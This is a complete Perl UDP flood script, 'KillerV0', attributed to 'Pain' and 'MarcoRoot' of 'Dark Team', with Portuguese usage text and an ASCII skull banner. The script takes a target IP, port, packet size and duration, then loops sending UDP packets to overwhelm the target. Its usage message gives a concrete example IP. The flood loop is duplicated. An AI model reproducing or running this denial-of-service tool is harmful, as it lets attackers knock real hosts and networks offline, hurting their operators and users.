#!/usr/bin/perl
 
##
#!/usr/bin/perl
 
use Socket;
use strict;

if ($#ARGV != 3) {
  print " [+] Autor : Pain\n";
  print " [+] Script : KillerV0\n";
  print " Use: KillerV0.pl <IP> <Porta> <Pacotes> <Tempo>\n";
  print " Exemplo: KillerV0.pl 189.72.161.68 80 65500 1000\n";
  print " Creditos: Dono - Pain  Ajudante - MarcoRoot  Testador - Pain\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "$ip Inválido\n";
$endtime = time() + ($time ? $time : 500);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print <<EOTEXT;
     
     
     
                   ...
                 ;::::;              Editado Por: Marco Root e Pain Modem/Down
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
        " Dark Team "
EOTEXT
     
print "Atacando $ip Porta" . ($port ? $port : "random") . " Com " .
($size ? "$size-Ataque" : "De Pacotes") . " " .
($time ? "Por $time Segundos" : "") . "\n";
  
for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;
     
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}